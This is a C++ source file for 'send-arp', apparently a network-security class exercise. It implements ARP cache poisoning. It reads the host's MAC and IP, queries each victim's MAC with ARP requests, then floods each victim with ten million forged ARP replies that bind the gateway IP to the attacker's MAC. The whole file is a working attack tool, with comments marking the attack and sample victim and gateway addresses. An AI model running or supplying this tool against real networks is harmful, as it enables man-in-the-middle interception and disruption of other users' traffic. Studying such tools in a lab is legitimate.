#include <cstdio>
#include <cstring>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/socket.h>
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac getAttackerMac(const char* dev) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return Mac::nullMac();

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return Mac::nullMac();
    }
    close(sock);
    return Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
}

Ip getAttackerIp(const char* dev) {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return Ip(0);

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        close(sock);
        return Ip(0);
    }
    close(sock);
    struct sockaddr_in* attacker_ip = (struct sockaddr_in*)&ifr.ifr_addr;

    return Ip(ntohl(attacker_ip->sin_addr.s_addr));
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0 || argc <4) {
		usage();
		return EXIT_FAILURE;
	}
	char* dev = argv[1]; //interface name
    Mac attacker_mac = getAttackerMac(dev);
    Ip attacker_ip = getAttackerIp(dev);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}
    
    struct pcap_pkthdr* header = {};
	const uint8_t* packet = {};
    Mac victim_mac[argc]; 
    int i = 2;
    //making arp request for all argvs
    while(i<argc){
        EthArpPacket arp_packet = {};
        Ip normal_SIP = Ip(argv[i]); //victim
        Ip normal_TIP = Ip(argv[i+1]); //gateway
        arp_packet.eth_.smac_ = attacker_mac;
        arp_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        arp_packet.eth_.type_ = htons(EthHdr::Arp);
        arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	    arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
        arp_packet.arp_.hln_ = Mac::Size;
	    arp_packet.arp_.pln_ = Ip::Size;
	    arp_packet.arp_.op_ = htons(ArpHdr::Request);
	    arp_packet.arp_.smac_ = attacker_mac;
	    arp_packet.arp_.sip_ = htonl(attacker_ip); //attacker's ip
	    arp_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	    arp_packet.arp_.tip_ = htonl(normal_SIP);
        int send_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
        if (send_res != 0) {
		            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", send_res, pcap_geterr(pcap));
	                }
        
        while (true) {
		    int recv_res = pcap_next_ex(pcap, &header, &packet);
            EthArpPacket *pointer = {};
		    if (recv_res == 0) continue;
        
		    if (recv_res == PCAP_ERROR || recv_res == PCAP_ERROR_BREAK) {
			    printf("pcap_next_ex return %d(%s)\n", recv_res, pcap_geterr(pcap));
			    break;
		    }
		    printf("%u bytes captured\n", header->caplen); //packer length
            pointer = (EthArpPacket *)packet;
            if((ntohs(*(uint16_t*)&packet[12])) == 0x806 && pointer->arp_.op_ == htons(ArpHdr::Reply)) { //check arp
                if(pointer->arp_.sip() == normal_SIP){
                    victim_mac[i] = pointer->arp_.smac();
                    break;
                }
            
            
        }
    
    }
    i+=2;
    }

    //attack
    for(int i = 2; i<argc; i+=2){
        Ip SIP = Ip(argv[i]); //victim
        Ip TIP = Ip(argv[i+1]); //gateway
        
            EthArpPacket bad_packet = {};
                bad_packet.eth_.dmac_ = victim_mac[i];
	            bad_packet.eth_.smac_ = attacker_mac;
	            bad_packet.eth_.type_ = htons(EthHdr::Arp);
            
	            bad_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	            bad_packet.arp_.pro_ = htons(EthHdr::Ip4);
                bad_packet.arp_.hln_ = Mac::Size;
	            bad_packet.arp_.pln_ = Ip::Size;
	            bad_packet.arp_.op_ = htons(ArpHdr::Reply);
	            bad_packet.arp_.smac_ = attacker_mac;
	            bad_packet.arp_.sip_ = htonl(TIP);
	            bad_packet.arp_.tmac_ = victim_mac[i];
	            bad_packet.arp_.tip_ = htonl(SIP);

			for(int j = 0; j<10000000; j++){
				int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&bad_packet), sizeof(EthArpPacket));
	        if (res != 0) {
		            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	                }
			}
        
                }
pcap_close(pcap);
}